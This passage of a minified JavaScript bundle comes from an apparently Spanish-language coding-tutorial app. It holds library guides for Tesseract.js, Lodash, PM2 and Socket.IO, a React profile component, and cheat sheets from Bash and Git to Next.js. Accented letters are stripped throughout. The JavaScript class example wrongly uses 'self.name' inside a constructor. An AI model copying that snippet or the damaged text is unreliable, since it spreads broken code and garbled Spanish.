Tesseract es el motor OCR (Reconocimiento ptico de Caracteres) original desarrollado por los ingenieros de Hewlett-Packard y actualmente mantenido por Google. Originalmente estaba escrito en C++, pero Tesseract.js compil su ncleo usando WebAssembly para que pueda correr directamente en tu navegador sin instalar nada!

## Leyendo Texto de una Imagen
Puedes pasarle un objeto File input, una URL o un String en Base64 y te dir qu texto encontr en la foto.

\`\`\`javascript
import Tesseract from 'tesseract.js';

// Leemos una foto normal y le decimos que busque idioma espaol (spa)
Tesseract.recognize(
  'https://tesseract.projectnaptha.com/img/eng_bw.png',
  'spa',
  { logger: info => console.log('Progreso:', info) } // Muestra barra de carga nativa
).then(({ data: { text } }) => {
  console.log("Texto extrado mgicamente:");
  console.log(text);
});
\`\`\`
`},{id:"lodash",name:"Lodash",packageName:"lodash",version:"v4.17.21",description:"Librera histrica y moderna de JS que desata un poder extremo manipulando objetos, arreglos y datos fuertemente.",icon:b.jsx(_o,{className:"lib-icon"}),tags:["Utilidades","Frontend","Backend"],link:"https://lodash.com/",guide:`
# Lodash - La Navaja Suiza de JavaScript

Lodash es una de las libreras ms descargadas en la historia de npm. Provee rutinas de utilidad para todo tipo de tareas comunes de programacin que nativamente tomaran ms tiempo.

## Por qu seguir usndolo?
Aunque JavaScript moderno ha incorporado muchas de sus funciones (como \`map\`, \`filter\`, \`reduce\`), Lodash sigue brillando en operaciones complejas de objetos y arreglos profundos.

## Casos de Uso Comunes

### Deep Clone (Clonado Profundo)
Clonar un objeto anidado en JS es difcil (spread operator \`...\` solo clona el primer nivel).
\`\`\`javascript
import cloneDeep from 'lodash/cloneDeep';

const objetoOriginal = { a: 1, b: { c: 2 } };
const clonPerfecto = cloneDeep(objetoOriginal);
\`\`\`

### Debounce (Debotar)
Ideal para recuadros de bsqueda. Evita que una funcin se ejecute 100 veces por segundo mientras el usuario escribe.
\`\`\`javascript
import debounce from 'lodash/debounce';

const buscar = debounce((texto) => {
  // Llama a la API solo cuando el usuario deje de escribir por 300ms
  api.search(texto);
}, 300);
\`\`\`
`},{id:"pm2",name:"PM2",packageName:"pm2",version:"v5.3.1",description:"Excepcional gestor de procesos en la industria para Node.js con un potente y automtico balanceador de carga.",icon:b.jsx(pc,{className:"lib-icon"}),tags:["DevOps","Backend","Configuracin"],link:"https://pm2.keymetrics.io/",guide:`
# PM2 - El Inmortalizador de Backends

Cuando terminas desarrollas una API en NodeJS en tu PC usas \`node index.js\` o \`nodemon\`. Pero si pasas eso a produccin en la nube (AWS, DigitalOcean)... si hay un error en el cdigo, el servidor explota y se apaga para SIEMPRE hasta que entres t a reiniciarlo manualmente. PM2 resuelve esto.

## Modos Principales
1.  **Reinicio Infinito:** Si la app crashea por un bug, PM2 la levanta de las cenizas en 200ms.
2.  **Modo Clster (El verdadero poder):** NodeJS corre en Solo 1 hilo (procesador core). Si tienes un servidor de 8 ncleos, NodeJS desperdicia 7 de ellos. Ejecutando \`pm2 start index.js -i max\`, PM2 levantar 8 instancias paralelas de tu App escondidas detrs de un solo puerto (Balanceador Automtico de Carga). Tu servidor aguanta 8 veces ms usuarios con un solo comando escrito.
`},{id:"socketio",name:"Socket.IO",packageName:"socket.io",version:"v4.7.2",description:"Librera legendaria para comunicacin bidireccional en tiempo real basada en eventos.",icon:b.jsx(Br,{className:"lib-icon"}),tags:["Real-time","WebSockets","Backend"],link:"https://socket.io/",guide:`
# Socket.IO - Tiempo Real Sin Sufrir

Los WebSockets nativos del navegador son geniales, pero a menudo se desconectan por micro-cortes de internet, asustan a los firewalls o fallan en mviles antiguos. Socket.IO toma los WebSockets y los envuelve en magia pura.

## Por qu es el Rey Histrico
1.  **Reconexin Mgica:** Si tu usuario entra a un tnel y pierde el 4G, Socket.io mantendr los mensajes "en espera" y cuando vuelva la seal los enviar automticamente sin que t programes nada.
2.  **Fallback a Polling:** Si el WiFi de una universidad tiene los WebSockets estrictamente bloqueados por seguridad, Socket.IO se da cuenta e instantneamente degrada su tecnologa a *Long-Polling* para garantizar que el chat siga funcionando de todas formas.
3.  **Salas (Rooms):** Puedes meter a 5 usuarios a una "Sala de Partida 1" e instar a NodeJS a mandar mensajes "solo a los de esa sala" con un simple comando.

## El Chat de 5 Minutos (Servidor)
\`\`\`javascript
const io = require("socket.io")(3000);

io.on("connection", (socket) => {
  // Cuando alguien se conecta
  console.log("Un usuario nuevo entr con ID:", socket.id);

  // Cuando RECIBE un mensaje llamado "chat_enviado"
  socket.on("chat_enviado", (mensaje) => {
    // REENVA a absolutamente todos los dems usuarios
    socket.broadcast.emit("nuevo_mensaje", mensaje);
  });
});
\`\`\`
`}],tee=()=>{const{user:a,role:e}=sr(),t=rr(),{xp:n,calculateLevel:i,favorites:r,favoriteLibraries:l,getModuleProgress:u}=Jc(),{level:d,nextLevelXp:p,currentLevelMin:f}=i(n),h=(n-f)/(p-f)*100,E=Object.entries(r),C=U.useMemo(()=>AN.filter(I=>l.includes(I.id)),[l]),A=U.useMemo(()=>C0.filter(I=>{const w=I.lessons.length;return u(I.id,w)===100}),[u]),j=(I,w)=>Go.isValidElement(I)?Go.cloneElement(I,{size:w}):I,R=I=>{t(`/libraries?id=${I}`)};return b.jsxs("div",{className:"profile-container",children:[b.jsx("div",{className:"profile-header-section",children:b.jsxs("div",{className:"profile-user-card",children:[b.jsxs("div",{className:"profile-avatar",children:[b.jsx("div",{className:"profile-avatar-wrapper",children:b.jsx("div",{className:"profile-avatar-inner",children:a?.photoURL?b.jsx("img",{src:a.photoURL,alt:"Avatar"}):b.jsx(qD,{size:80,color:"var(--text-muted)"})})}),b.jsx("div",{className:"level-badge",children:d})]}),b.jsxs("div",{className:"profile-user-info",children:[b.jsx("h1",{children:a?.displayName||"Desarrollador"}),b.jsxs("div",{className:"profile-meta",children:[b.jsx("span",{className:"profile-email",children:a?.email}),e&&b.jsx("span",{className:`role-badge ${e}`,children:e==="admin"?"Administrador":"Estudiante"})]}),b.jsxs("div",{className:"xp-bar-container",children:[b.jsxs("div",{className:"xp-info",children:[b.jsxs("span",{children:["Nivel ",d]}),b.jsxs("span",{children:[n," / ",p," XP"]})]}),b.jsx("div",{className:"xp-bar-bg",children:b.jsx("div",{className:"xp-bar-fill",style:{width:`${h}%`}})})]})]})]})}),b.jsxs("div",{className:"stats-grid",children:[b.jsxs("div",{className:"stat-card",children:[b.jsx(SD,{className:"stat-icon"}),b.jsxs("div",{className:"stat-content",children:[b.jsx("h3",{children:E.length}),b.jsx("p",{children:"Lecciones Fav"})]})]}),b.jsxs("div",{className:"stat-card",children:[b.jsx(S0,{className:"stat-icon"}),b.jsxs("div",{className:"stat-content",children:[b.jsx("h3",{children:l.length}),b.jsx("p",{children:"Libs favoritas"})]})]}),b.jsxs("div",{className:"stat-card",children:[b.jsx(Ys,{className:"stat-icon"}),b.jsxs("div",{className:"stat-content",children:[b.jsx("h3",{children:A.length}),b.jsx("p",{children:"Mdulos Listos"})]})]})]}),b.jsxs("div",{className:"profile-grid",children:[b.jsxs("div",{className:"profile-section lib-fav-section",children:[b.jsxs("h2",{className:"section-title",children:[b.jsx(jD,{className:"inline-icon",size:24})," Librerias Guardadas"]}),b.jsx("div",{className:"profile-fav-libs",children:C.length>0?C.map(I=>b.jsxs("div",{className:"fav-lib-item",onClick:()=>R(I.id),style:{cursor:"pointer"},title:"Ver detalles e instalacin",children:[b.jsx("div",{className:"fav-lib-icon",children:j(I.icon,20)}),b.jsx("span",{children:I.name}),b.jsx(dP,{style:{marginLeft:"auto",opacity:.5},size:20})]},I.id)):b.jsx("div",{className:"empty-state",children:"No tienes Librerias favoritas an."})})]}),b.jsxs("div",{className:"profile-section modules-section",children:[b.jsxs("h2",{className:"section-title",children:[b.jsx(_o,{className:"inline-icon",size:24})," Mdulos Completados"]}),b.jsx("div",{className:"completed-modules-list",children:A.length>0?A.map(I=>b.jsxs("div",{className:"module-complete-card",children:[b.jsx("div",{className:"module-icon-box",children:b.jsx(Ys,{size:24})}),b.jsxs("div",{className:"module-details",children:[b.jsx("h4",{children:I.title}),b.jsxs("span",{children:[I.lessons.length," Lecciones"]})]})]},I.id)):b.jsx("div",{className:"empty-state",children:"An no has completado ningn mdulo al 100%."})})]}),b.jsxs("div",{className:"profile-section lessons-section",children:[b.jsxs("h2",{className:"section-title",children:[b.jsx(S0,{className:"inline-icon",size:24})," Lecciones Destacadas"]}),b.jsx("div",{className:"fav-lessons-list",children:E.length>0?E.map(([I,w])=>b.jsxs("div",{className:"fav-lesson-card",onClick:()=>t(`/learn/${w.moduleId}?lesson=${I}`),style:{cursor:"pointer"},title:"Ir a la leccin",children:[b.jsxs("div",{className:"lesson-info",children:[b.jsx("h4",{children:w.lessonTitle}),b.jsx("span",{children:w.moduleTitle})]}),b.jsx(dP,{size:20,color:"var(--primary)"})]},I)):b.jsx("div",{className:"empty-state",children:"No hay lecciones marcadas como favoritas."})})]})]})]})},nee={id:"prog-bases",title:"Bases de Programacin",icon:b.jsx(N1,{size:18}),description:"Fundamentos universales de lgica y algoritmos.",sections:[{name:"Variables y Tipos",items:[{label:"String",value:"\"Texto\", 'Ms texto', `Template`"},{label:"Number",value:"10 (Integer), 10.5 (Float), NaN"},{label:"Boolean",value:"true (verdadero), false (falso)"},{label:"Colecciones",value:"[1,2,3] (Array/List), {key: val} (Object/Map)"}]},{name:"Control de Flujo",items:[{label:"If/Else",value:"if (cond) { ... } else if { ... } else { ... }"},{label:"Switch",value:"switch(val) { case x: ... break; default: ... }"},{label:"Ternario",value:"condicin ? si_verdadero : si_falso"}]},{name:"Bucles (Loops)",items:[{label:"For",value:"for (let i = 0; i < n; i++) { ... }"},{label:"While",value:"while (condicin) { ... }"},{label:"For Each",value:"array.forEach(item => { ... });"}]},{name:"Operadores",items:[{label:"Lgicos",value:"&& (AND), || (OR), ! (NOT)"},{label:"Aritmticos",value:"+, -, *, /, % (mdulo), ++, --"},{label:"Comparar",value:"== (valor), === (valor+tipo), !=, !==, <, >"}]}]},iee={id:"bash",title:"Bash & Terminal",icon:b.jsx(N1,{size:18}),description:"Control manual del sistema y automatizacin.",sections:[{name:"Navegacin",items:[{label:"Dnde",value:"pwd (ubicacin), ls (listar), ls -la (detallado)"},{label:"Ir",value:"cd <dir>, cd .. (atrs), cd ~ (home), cd - (previo)"}]},{name:"Gestin Archivos",items:[{label:"Crear",value:"touch <file> (archivo), mkdir <dir> (carpeta)"},{label:"Ver",value:"cat <file> (todo), head (inicio), tail -f (seguimiento)"},{label:"Mover",value:"mv <src> <dest> (mover/renombrar), cp -r (copiar carpeta)"},{label:"Borrar",value:"rm <file>, rm -rf <dir> (recursivo y forzado)"}]},{name:"Permisos & Sistema",items:[{label:"Permisos",value:"chmod +x <file> (ejecutable), chown user:group"},{label:"Procesos",value:"top | htop (ver carga), kill -9 <pid> (matar)"},{label:"Red",value:"curl <url>, ping <host>, ip addr (ver IP)"}]},{name:"Trucos",items:[{label:"History",value:"history (comandos previos), ctrl+r (buscar)"},{label:"Alias",value:'alias ll="ls -la" (atajo temporal)'},{label:"Pipe",value:'ls | grep "txt" (enviar salida a otro comando)'}]}]},oee={id:"git",title:"Git & GitHub",icon:b.jsx(PD,{size:18}),description:"Control de versiones y flujo de trabajo profesional.",sections:[{name:"Workflow Bsico",items:[{label:"Init",value:"git init (inicia repo); git clone <url> (descarga)"},{label:"Snapshot",value:'git add . -> git commit -m "mensaje"'},{label:"Sync",value:"git pull (traer cambios); git push (subir)"},{label:"Status",value:"git status (estado); git log --oneline (historial)"}]},{name:"Ramas (Branches)",items:[{label:"Listar/Crear",value:"git branch (ver); git branch <name> (crear)"},{label:"Switch",value:"git checkout <name> o git switch <name>"},{label:"Fusionar",value:"git merge <name> (trae cambios a rama actual)"},{label:"Borrar",value:"git branch -d <name> (local); -D (forzar)"}]},{name:"Deshacer Cambios",items:[{label:"Stage",value:"git restore --staged <file> (quitar del add)"},{label:"Discard",value:"git restore <file> (borrar cambios locales)"},{label:"Reset",value:"git reset --hard HEAD~1 (borra ultimo commit)"},{label:"Revert",value:"git revert <commit-id> (crea commit inverso)"}]},{name:"Utilidades Avanzadas",items:[{label:"Stash",value:"git stash (guardar); git stash pop (recuperar)"},{label:"Diff",value:"git diff (ver cambios); git show <id> (ver commit)"},{label:"Remotes",value:"git remote -v; git remote add origin <url>"}]}]},see={id:"html",title:"HTML5",icon:b.jsx(jp,{size:18}),description:"Estructura semntica, multimedia y formularios web.",sections:[{name:"Boilerplate & Meta",items:[{label:"Doctype",value:"<!DOCTYPE html>"},{label:"Viewport",value:'<meta name="viewport" content="width=device-width, initial-scale=1.0">'},{label:"CharSet",value:'<meta charset="UTF-8">'},{label:"Favicon",value:'<link rel="icon" href="favicon.ico">'}]},{name:"Estructura Semntica",items:[{label:"Encabezado",value:"<header>...</header>"},{label:"Navegacin",value:"<nav>...</nav>"},{label:"Contenido",value:"<main> <section> <article> <aside>"},{label:"Pie",value:"<footer>...</footer>"},{label:"Detalles",value:"<details><summary>Click aqu</summary>...</details>"}]},{name:"Texto y Listas",items:[{label:"Ttulos",value:"<h1> hasta <h6>"},{label:"Prrafo",value:"<p>Este es un texto</p>"},{label:"nfasis",value:"<strong> (bold), <em> (italic)"},{label:"Listas",value:"<ul><li> (desordenada), <ol><li> (ordenada), <dl><dt><dd> (descripcin)"}]},{name:"Multimedia y Enlaces",items:[{label:"Imagen",value:'<img src="url" alt="descripcin" loading="lazy">'},{label:"Enlace",value:'<a href="url" target="_blank" rel="noopener">Link</a>'},{label:"Video",value:'<video controls poster="img.jpg"><source src="v.mp4"></video>'},{label:"Audio",value:'<audio controls src="a.mp3"></audio>'}]},{name:"Formularios Avanzados",items:[{label:"Estructura",value:'<form action="/api" method="POST"><fieldset><legend>Datos</legend>'},{label:"Inputs",value:"text, password, email, number, date, range, color, file"},{label:"Seleccin",value:'<select><option>, <input type="radio|checkbox">'},{label:"Botones",value:'<button type="submit|reset|button">'},{label:"Datalist",value:'<input list="browsers"><datalist id="browsers">...'}]},{name:"Tablas",items:[{label:"Bsico",value:"<table><thead><tr><th>...<tbody><tr><td>"},{label:"Caption",value:"<caption>Ttulo de la tabla</caption>"},{label:"Combinar",value:'<td colspan="2"> (columnas), <td rowspan="2"> (filas)'}]}]},ree={id:"css",title:"CSS3",icon:b.jsx(DD,{size:18}),description:"Estilos, layouts modernos y diseo responsivo.",sections:[{name:"Selectores y Especificidad",items:[{label:"Bsicos",value:"* (todos), tag, .clase, #id"},{label:"Combinadores",value:"div p (descendiente), div > p (hijo), div + p (adyacente)"},{label:"Pseudo-clases",value:":hover, :focus, :nth-child(n), :not(), :checked"},{label:"Pseudo-elems",value:'::before, ::after (requieren content: "")'}]},{name:"Box Model & Unidades",items:[{label:"Modelo",value:"margin > border > padding > content"},{label:"Sizing",value:"box-sizing: border-box; (incluye padding en width)"},{label:"Absolutas",value:"px, pt, cm"},{label:"Relativas",value:"rem (root em), em (parent), %, vh, vw"}]},{name:"Flexbox (Contenedor)",items:[{label:"Display",value:"display: flex | inline-flex"},{label:"Direccin",value:"flex-direction: row | column | row-reverse"},{label:"Alineacin",value:"justify-content (eje principal), align-items (eje cruzado)"},{label:"Envolver",value:"flex-wrap: wrap | nowrap"},{label:"Gap",value:"gap: 20px; (espacio entre celdas)"}]},{name:"CSS Grid",items:[{label:"Grid",value:"display: grid; grid-template-columns: repeat(3, 1fr);"},{label:"reas",value:'grid-template-areas: "h h" "s m";'},{label:"Posicin",value:"grid-column: 1 / 3; grid-row: 2;"}]},{name:"Posicionamiento",items:[{label:"Tipos",value:"static, relative, absolute (parent rel), fixed, sticky"},{label:"Z-Index",value:"z-index: 10; (requiere posicin != static)"},{label:"Centrado Abs",value:"top: 50%; left: 50%; transform: translate(-50%, -50%);"}]},{name:"Filtros y Transiciones",items:[{label:"Filtros",value:"filter: blur(5px) grayscale(1) drop-shadow(...)"},{label:"Transicin",value:"transition: all 0.3s ease-in-out;"},{label:"Animacin",value:"animation: name duration infinite; @keyframes name {...}"}]},{name:"Centrado (Cheat Codes)",items:[{label:"Flexbox",value:"display: flex; justify-content: center; align-items: center;"},{label:"Grid",value:"display: grid; place-items: center;"},{label:"Margin Auto",value:"margin: 0 auto; (solo horizontal, requiere width)"},{label:"Text Align",value:"text-align: center; (para texto e inline-block)"},{label:"Absoluto",value:"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);"}]},{name:"Botones & UI",items:[{label:"Base",value:"border: none; outline: none; cursor: pointer; padding: 0.8rem 1.5rem;"},{label:"Glassmorphism",value:"background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px);"},{label:"Sombras",value:"box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);"},{label:"Gradiente",value:"background: linear-gradient(135deg, #646cff 0%, #7b2ff7 100%);"}]},{name:"Media Queries",items:[{label:"Mobile First",value:"@media (min-width: 768px) { ... }"},{label:"Desktop First",value:"@media (max-width: 1024px) { ... }"},{label:"Orientacin",value:"@media (orientation: landscape) { ... }"},{label:"Prefer Dark",value:"@media (prefers-color-scheme: dark) { ... }"}]}]},lee={id:"tailwind",title:"Tailwind CSS",icon:b.jsx(kD,{size:18}),description:"Framework CSS de utilidades para un desarrollo veloz y consistente.",sections:[{name:"Layout & Box Model",items:[{label:"Display",value:"flex, grid, block, inline-block, hidden, contents"},{label:"Position",value:"relative, absolute, fixed, sticky, inset-0, z-50"},{label:"Size",value:"w-full, h-screen, max-w-7xl, min-h-[500px]"},{label:"Spacing",value:"p-4 (padding), m-2 (margin), -m-4 (negativo), space-x-4"},{label:"Overflow",value:"overflow-hidden, overflow-y-auto, overflow-x-scroll"}]},{name:"Flexbox & Grid",items:[{label:"Flex",value:"flex-row, flex-col, justify-between, items-center, gap-4"},{label:"Flex Item",value:"grow, shrink, basis-0, order-first, flex-1"},{label:"Grid",value:"grid-cols-12, col-span-4, grid-rows-3, gap-x-8"},{label:"Place",value:"place-items-center, place-content-center"}]},{name:"Tipografa",items:[{label:"Size/Weight",value:"text-sm, text-4xl, font-light, font-bold, italic"},{label:"Alignment",value:"text-left, text-center, text-justify"},{label:"Style",value:"uppercase, capitalize, underline, antialiased"},{label:"Letter/Line",value:"tracking-tighter, leading-tight, whitespace-nowrap"}]},{name:"Bordes & Efectos",items:[{label:"Border",value:"border, border-2, border-b, border-dashed"},{label:"Radius",value:"rounded-sm, rounded-lg, rounded-full, rounded-tr-none"},{label:"Shadows",value:"shadow-sm, shadow-xl, shadow-inner, shadow-blue-500/50"},{label:"Opacity",value:"opacity-0, opacity-50, opacity-100"},{label:"Filters",value:"blur-md, brightness-125, drop-shadow-lg"}]},{name:"Interactividad & Estados",items:[{label:"Pseudo",value:"hover:bg-blue, focus:ring-2, active:scale-95"},{label:"Group/Peer",value:"group-hover:opacity-100, peer-checked:block"},{label:"Responsive",value:"sm:p-2, md:p-6, lg:grid-cols-3, xl:max-w-screen-2xl"},{label:"Dark Mode",value:"dark:bg-slate-900, dark:text-white"}]},{name:"Transiciones & Animaciones",items:[{label:"Transition",value:"transition-all, duration-500, ease-in-out, delay-150"},{label:"Animate",value:"animate-spin (giro), animate-pulse (latido), animate-bounce"}]},{name:"Mezcla & Clipping",items:[{label:"Mix Blend",value:"mix-blend-overlay, mix-blend-multiply"},{label:"Gradients",value:"bg-gradient-to-r, from-blue-500, to-teal-400"}]}]},cee={id:"javascript",title:"JavaScript",icon:b.jsx(jp,{size:18}),description:"Lgica embebida en la web, interactividad y backend.",sections:[{name:"Variables y Tipos",items:[{label:"Declaracin",value:"const (constante), let (variable de bloque), var (legacy)"},{label:"Primitivos",value:"String, Number, Boolean, Null, Undefined, Symbol"},{label:"Template Str",value:"`Hola ${nombre}` (literales de plantilla)"}]},{name:"Funciones ES6+",items:[{label:"Arrow Fn",value:"const add = (a, b) => a + b;"},{label:"Parmetros",value:'function greet(name = "User") { ... }'},{label:"IIFE",value:"(function() { ... })(); (ejecucin inmediata)"}]},{name:"Arrays (Comunes)",items:[{label:"Transformar",value:".map(x => x * 2), .filter(x => x > 0)"},{label:"Acumular",value:".reduce((acc, curr) => acc + curr, 0)"},{label:"Buscar",value:".find(x => x.id === 1), .findIndex(...), .includes(val)"},{label:"Mutar",value:".push() (fin), .pop() (fin), .shift() (inicio), .unshift() (inicio)"}]},{name:"Objetos",items:[{label:"Destructuring",value:"const { name, age } = user; (extraer propiedades)"},{label:"Spread",value:"const copy = { ...oldObj, newProp: 1 };"},{label:"Optional Ch",value:"user?.profile?.name (evita errores si es null)"},{label:"Entries",value:"Object.keys(obj), Object.values(obj), Object.entries(obj)"}]},{name:"Asincrona",items:[{label:"Promises",value:"new Promise((res, rej) => ...); .then().catch().finally()"},{label:"Async/Await",value:"async function fetch() { const res = await data; }"},{label:"Fetch API",value:"fetch(url).then(r => r.json()).then(data => ...)"}]},{name:"Manipulacin del DOM",items:[{label:"Selectores",value:'document.querySelector("#id"), .querySelectorAll(".class")'},{label:"Eventos",value:'el.addEventListener("click", (e) => ...)'},{label:"Clases",value:'el.classList.add("btn"), .remove(), .toggle("active")'},{label:"Estilos",value:'el.style.backgroundColor = "red";'}]},{name:"Control de Errores",items:[{label:"Try/Catch",value:"try { ... } catch (err) { ... } finally { ... }"},{label:"Throw",value:'throw new Error("Algo sali mal");'}]},{name:"Almacenamiento (Web API)",items:[{label:"Local Storage",value:'localStorage.setItem("k", "v"); localStorage.getItem("k");'},{label:"Session Storage",value:'sessionStorage.setItem("k", "v"); (se borra al cerrar)'},{label:"JSON",value:"JSON.stringify(obj); (obj a string); JSON.parse(str); (string a obj)"}]},{name:"Mdulos (ESM)",items:[{label:"Export",value:"export const myVar = 1; export default MyComponent;"},{label:"Import",value:'import { myVar } from "./file"; import React from "react";'},{label:"Dinmico",value:'import("./file").then(module => ...);'}]},{name:"Clases (OOP)",items:[{label:"Base",value:"class Player { constructor(n) { self.name = n } }"},{label:"Herencia",value:"class Archer extends Player { shoot() { ... } }"},{label:"Privados",value:"#secretProperty = 10; (solo accesible dentro)"}]},{name:"Trucos de Lgica",items:[{label:"Short Circuit",value:"const x = a || b; (si a es falsy, toma b)"},{label:"Nullish",value:"const x = a ?? b; (si a es null/undefined, toma b)"},{label:"Boolean",value:"!!value; (convierte cualquier cosa a boolean)"}]},{name:"Control de Tiempo",items:[{label:"Timeout",value:"setTimeout(() => { ... }, 1000); (ejecuta una vez)"},{label:"Interval",value:"setInterval(() => { ... }, 1000); (ejecuta n veces)"},{label:"Borrar",value:"clearTimeout(id); clearInterval(id);"}]},{name:"Consola & Depuracin",items:[{label:"Log",value:"console.log(); console.warn(); console.error();"},{label:"Data",value:"console.table(arr); (muestra datos en tabla)"},{label:"Tiempo",value:'console.time("label"); console.timeEnd("label");'}]}]},uee={id:"typescript",title:"TypeScript",icon:b.jsx(jp,{size:18}),description:"JavaScript con superpoderes de tipado esttico.",sections:[{name:"Tipos Bsicos",items:[{label:"Primitivos",value:"string, number, boolean, symbol, bigint, void, never"},{label:"Especiales",value:"any (ignorar tipado), unknown (seguro), null, undefined"},{label:"Arrays",value:"number[], Array<string>, [number, string] (tupla)"}]},{name:"Interfaces & Types",items:[{label:"Interface",value:"interface User { id: number; name: string; }"},{label:"Type Alias",value:"type Point = { x: number; y: number; };"},{label:"Extendiendo",value:"interface Admin extends User { role: string; }"},{label:"Opcionales",value:'name?: string; (la "?" indica opcional)'},{label:"Readonly",value:"readonly id: number; (no modificable)"}]},{name:"Tipos de Unin e Interseccin",items:[{label:"Unin",value:"type ID = string | number; (puede ser uno u otro)"},{label:"Interseccin",value:"type Person = User & { age: number }; (combina ambos)"},{label:"Literales",value:'type Role = "admin" | "user" | "guest";'}]},{name:"Funciones",items:[{label:"Tipado Fn",value:"(a: number, b: number): number => a + b"},{label:"Retorno Void",value:'function log(): void { console.log("Hi"); }'},{label:"Optional Param",value:"function (a: number, b?: number) { ... }"}]},{name:"Genricos",items:[{label:"Bsico",value:"function identity<T>(arg: T): T { return arg; }"},{label:"Interface Gen",value:"interface Response<T> { data: T; status: number; }"},{label:"Constraints",value:"function log<T extends { len: number }>(arg: T) { ... }"}]},{name:"Utility Types (Fundamentales)",items:[{label:"Partial<T>",value:"Convierte todas las propiedades en opcionales."},{label:"Pick<T, K>",value:"Selecciona solo un conjunto de propiedades K de T."},{label:"Omit<T, K>",value:"Elimina las propiedades K del tipo T."},{label:"Readonly<T>",value:"Hace que todas las propiedades sean de solo lectura."},{label:"Record<K, T>",value:"Crea un objeto con llaves K y valores T."}]},{name:"Otros",items:[{label:"Enums",value:"enum Direction { Up, Down, Left, Right }"},{label:"Casting",value:"const val = (arg as string).length; o <string>arg"},{label:"Keyof",value:"type Keys = keyof User; (retorna unin de llaves)"},{label:"Typeof",value:"const x = 1; type T = typeof x; (infiere tipo de valor)"}]}]},dee={id:"react",title:"React",icon:b.jsx(yD,{size:18}),description:"Biblioteca para construir interfaces declarativas y basadas en componentes.",sections:[{name:"Hooks de Estado & Ciclo de Vida",items:[{label:"useState",value:"const [val, setVal] = useState(init); o setVal(prev => prev + 1)"},{label:"useEffect",value:"useEffect(() => { ... return () => cleanup }, [deps]);"},{label:"useReducer",value:"const [state, dispatch] = useReducer(reducer, initialState);"},{label:"useRef",value:"const inputRef = useRef(null); inputRef.current.focus();"}]},{name:"Memoizacin & Rendimiento",items:[{label:"React.memo",value:"const MyComp = React.memo(({ prop }) => ...); (evita re-renders si props no cambian)"},{label:"useMemo",value:"const result = useMemo(() => expensiveFn(a), [a]); (memoriza valor)"},{label:"useCallback",value:"const fn = useCallback(() => { ... }, [deps]); (memoriza instancia de funcin)"}]},{name:"Context API",items:[{label:"Crear",value:"const MyCtx = createContext(null);"},{label:"Provider",value:"<MyCtx.Provider value={data}>{children}</MyCtx.Provider>"},{label:"Consumir",value:"const data = useContext(MyCtx);"}]},{name:"Estructura & JSX",items:[{label:"Fragments",value:"<> ... </> o <React.Fragment key={id}> ... </React.Fragment>"},{label:"Conditional",value:"{ ok ? <A /> : <B /> } o { ok && <A /> }"},{label:"Lists",value:"map((item, idx) => <li key={item.id}>{item.name}</li>)"},{label:"Portals",value:"createPortal(<Modal />, document.body);"}]},{name:"Custom Hooks",items:[{label:"Definir",value:"function useWindowSize() { ... return size; }"},{label:"Reglas",value:"Solo en el nivel superior. Solo desde funciones de React."}]},{name:"React Router v6+",items:[{label:"Routes",value:'<Routes><Route path="/" element={<Home />}/></Routes>'},{label:"Navigate",value:'const nav = useNavigate(); nav("/login");'},{label:"Params",value:"const { id } = useParams();"},{label:"Query",value:'const [search] = useSearchParams(); search.get("q")'}]},{name:"Formularios & Refs",items:[{label:"Controlado",value:"value={form.name} onChange={e => setForm({...form, name: e.target.value})}"},{label:"Prev Default",value:"const submit = (e) => { e.preventDefault(); ... }"}]},{name:"Patrones Avanzados",items:[{label:"HOC",value:"const withAuth = (Comp) => (props) => { ... return <Comp {...props} /> }"},{label:"Render Props",value:"<Mouse render={pos => <h1>{pos.x}</h1>} />"},{label:"Compound",value:"<Tabs><Tabs.List><Tabs.Tab>... (estado compartido)"}]},{name:"React Testing Library",items:[{label:"Render",value:"render(<MyComp />);"},{label:"Queries",value:'screen.getByText("Hola"); screen.findByRole("button");'},{label:"Events",value:'fireEvent.click(btn); await userEvent.type(input, "txt");'}]}]},pee={id:"state-mgmt",title:"Gestin de Estado",icon:b.jsx(wp,{size:18}),description:"Herramientas para manejar el estado global de la aplicacin.",sections:[{name:"Zustand (Recomendado)",items:[{label:"Store",value:"const useStore = create(set => ({ count: 0, inc: () => set(...) }));"},{label:"Uso",value:"const { count, inc } = useStore();"}]},{name:"Redux Toolkit",items:[{label:"Slice",value:"createSlice({ name, initialState, reducers: { ... } });"},{label:"Store",value:"configureStore({ reducer: { root: slice.reducer } });"},{label:"Hooks",value:"useSelector(state => ...); useDispatch();"}]},{name:"React Query (TanStack)",items:[{label:"Query",value:'const { data } = useQuery({ queryKey: ["k"], queryFn: fetcher });'},{label:"Mutation",value:"const { mutate } = useMutation({ mutationFn: poster });"}]}]},mee={id:"nextjs",title:"Next.js",icon:b.jsx(yD,{size:18}),description:"Framework avanzado para React con Renderizado Hbrido y App Router.",sections:[{name:"App Router & Routing",items:[{label:"Layouts",value:"layout.tsx (persiste estado, comn a rutas hijas)"},{label:"Pages",value:"page.tsx (IU nica de la ruta)"},{label:"Loading",value:"loading.tsx (IU de carga con Suspense auto)"},{label:"Error",value:"error.tsx (Client component para atrapar errores)"},{label:"Rutas Dinmicas",value:"[slug]/page.tsx -> params.slug"},{label:"Route Handlers",value:"route.ts (API Endpoints: GET, POST, etc.)"}]},{name:"Server vs Client Components",items:[{label:"Server (Default)",value:"Render en servidor, carga menos JS, directo a DB/Secretos."},{label:"Client",value:'"use client"; permite Hooks y Event Listeners (onClick).'},{label:"Cundo usar RSC",value:"Fetching, seguridad, rendimiento base."},{label:"Cundo usar RCC",value:"Interactividad, browser APIs, context."}]},{name:"Data Fetching & Caching",items:[{label:"Server Fetch",value:"await fetch(url); (en Async Server Components)"},{label:"No Caching",value:'fetch(url, { cache: "no-store" });'},{label:"Revalidate (ISR)",value:"fetch(url, { next: { revalidate: 60 } }); (cada minuto)"},{label:"Server Actions",value:'"use server"; export async function fn() { ... }'}]},{name:"SEO & Metadata",items:[{label:"Static",value:'export const metadata = { title: "App" };'},{label:"Dynamic",value:"export async function generateMetadata({ params }) { ... }"},{label:"Favicon/OpenGraph",value:"Pestaas: favicon.ico, opengraph-image.png (File-based)"}]},{name:"Optimizacin",items:[{label:"Images",value:'<Image src={src} priority alt="Alt" /> (Auto WebP/Lazy)'},{label:"Fonts",value:"next/font/google (Cero CLS, descarga fuentes en build)"},{label:"Scripts",value:'<Script src="..." strategy="afterInteractive" />'}]},{name:"Middleware & 